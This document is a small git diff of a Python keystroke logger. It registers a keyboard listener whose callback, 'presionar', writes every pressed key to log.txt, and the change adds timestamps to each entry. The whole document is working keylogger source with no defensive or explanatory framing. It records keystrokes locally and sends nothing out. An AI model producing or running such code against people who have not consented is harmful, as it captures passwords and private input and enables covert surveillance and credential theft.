@@ -3,7 +3,7 @@ import logging
 
 
 
-logging.basicConfig(filename="log.txt", level=logging.DEBUG, format="%(message)s")
+logging.basicConfig(filename="log.txt", level=logging.DEBUG, format="%(asctime)s - %(message)s")
 
 def presionar(key):
     logging.info(str(key))
@@ -11,7 +11,4 @@ def presionar(key):
 with Listener(on_press=presionar) as listener:
     listener.join()
     
-
-    
-
 
